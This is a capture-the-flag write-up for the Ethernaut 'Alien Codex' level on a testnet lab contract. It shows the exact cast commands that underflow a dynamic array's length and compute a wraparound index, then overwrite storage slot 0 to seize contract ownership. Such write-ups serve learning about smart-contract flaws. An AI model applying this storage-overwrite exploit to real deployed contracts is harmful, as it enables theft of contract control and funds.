# Ethernaut Challenge 19 — Alien Codex

## 🎯 Goal

Claim ownership of the contract.

**Instance:**

```
0x18D6E71d6902673445DC30c1271c7e56007E9026
```

---

## 🧠 Key Concepts

This challenge tests understanding of:

* Solidity **storage layout**
* **Variable packing**
* **Dynamic arrays in storage**
* **Integer underflow (Solidity <0.8)**
* Direct **storage manipulation via index arithmetic**

---

## 🔍 Step 1 — Inspect the Contract

Set the instance:

```bash
ALIEN_CODEX_SEPOLIA=0x18D6E71d6902673445DC30c1271c7e56007E9026
```

Check initial state:

```bash
cast call $ALIEN_CODEX_SEPOLIA "contact()(bool)" --rpc-url $SEPOLIA_RPC_URL
```

```
false
```

```bash
cast call $ALIEN_CODEX_SEPOLIA "owner()(address)" --rpc-url $SEPOLIA_RPC_URL
```

```
0x0BC04aa6aaC163A6B3667636D798FA053D43BD11
```

---

## 🧱 Step 2 — Understand Storage Layout

Solidity packs variables when possible.

### Layout:

```
slot 0:
  - owner (20 bytes)
  - contact (1 byte)

slot 1:
  - codex.length

slot keccak256(1):
  - codex[0]

slot keccak256(1) + 1:
  - codex[1]

slot keccak256(1) + 2:
  - codex[2]

And so on..
```

---

### Verify on-chain

**Slot 0:**

```bash
cast storage $ALIEN_CODEX_SEPOLIA 0 --rpc-url $SEPOLIA_RPC_URL
```

```
0x0000000000000000000000000bc04aa6aac163a6b3667636d798fa053d43bd11
```

→ packed `contact` (0 or false) and _owner (0bc04aa6aac163a6b3667636d798fa053d43bd11)

---

**Slot 1 (array length):**

```bash
cast storage $ALIEN_CODEX_SEPOLIA 1 --rpc-url $SEPOLIA_RPC_URL
```

```
0x...00
```

→ array is empty

---

Trying to read element:

```bash
cast call $ALIEN_CODEX_SEPOLIA "codex(uint256)" 0 --rpc-url $SEPOLIA_RPC_URL
```

Reverts → expected (out-of-bounds)

---

## 📦 Step 3 — Dynamic Array Storage

For:

```solidity
bytes32[] public codex;
```

Storage rule:

```
codex[i] → storage[keccak256(1) + i]
```

So:

```
keccak256(1)          → codex[0]
keccak256(1) + 1      → codex[1]
keccak256(1) + 2      → codex[2]
keccak256(1) + i      → codex[i]
```

---

## 🎯 Step 4 — Exploit Strategy

We want to overwrite **slot 0 (owner)**.

So we need:

```
keccak256(1) + i = 0
```

which is equal to say:

```
keccak256(1) + i = 2^256
```

Because storage wraps around (uint256 overflow).

---

### Solve for `i`

```text
i = 2^256 - keccak256(1)
```

In Solidity:

```solidity
bytes32 k = keccak256(abi.encode(uint256(1)));
uint256 i = type(uint256).max + 1 - uint256(k);
```

Since `type(uint256).max` is `2^256 - 1` we need to add `+ 1` to have `2^256`.

Computed value:

```
i = 35707666377435648211887908874984608119992236509074197713628505308453184860938
```

---

## ⚠️ Step 5 — Enable the Modifier

The modifier requires:

```solidity
assert(contact);
```

So first:

```bash
cast send $ALIEN_CODEX_SEPOLIA \
    "makeContact()" \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Verify:

```bash
cast call $ALIEN_CODEX_SEPOLIA "contact()(bool)" --rpc-url $SEPOLIA_RPC_URL
```

```
true
```

---

### Storage change (slot 0)

```bash
cast storage $ALIEN_CODEX_SEPOLIA 0 --rpc-url $SEPOLIA_RPC_URL
```

```
0x...01...owner
```

→ `contact = true` is now packed in slot 0

---

## 💥 Step 6 — Trigger Underflow

```solidity
codex.length--;
```

Since length = 0 → underflows to:

```
2^256 - 1
```

Execute:

```bash
cast send $ALIEN_CODEX_SEPOLIA \
    "retract()" \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Verify:

```bash
cast storage $ALIEN_CODEX_SEPOLIA 1 --rpc-url $SEPOLIA_RPC_URL
```

```
0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
```

Now **any index is valid**.

---

## 🧨 Step 7 — Overwrite Owner

Prepare address as `bytes32`:

```
0x000000000000000000000000ecf94300dd67bb8c31f41be3a2136d3f0abfb0b0
```

Execute:

```bash
cast send $ALIEN_CODEX_SEPOLIA \
    "revise(uint256,bytes32)" \
    35707666377435648211887908874984608119992236509074197713628505308453184860938 \
    0x000000000000000000000000ecf94300dd67bb8c31f41be3a2136d3f0abfb0b0 \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

---

## ✅ Step 8 — Verify Ownership

```bash
cast storage $ALIEN_CODEX_SEPOLIA 0 --rpc-url $SEPOLIA_RPC_URL
```

```
0x000000000000000000000000ecf94300dd67bb8c31f41be3a2136d3f0abfb0b0
```

```bash
cast call $ALIEN_CODEX_SEPOLIA "owner()(address)" --rpc-url $SEPOLIA_RPC_URL
```

```
0xeCF94300dD67bB8c31F41BE3a2136D3f0abFb0B0
```

🎉 **Ownership successfully taken!**

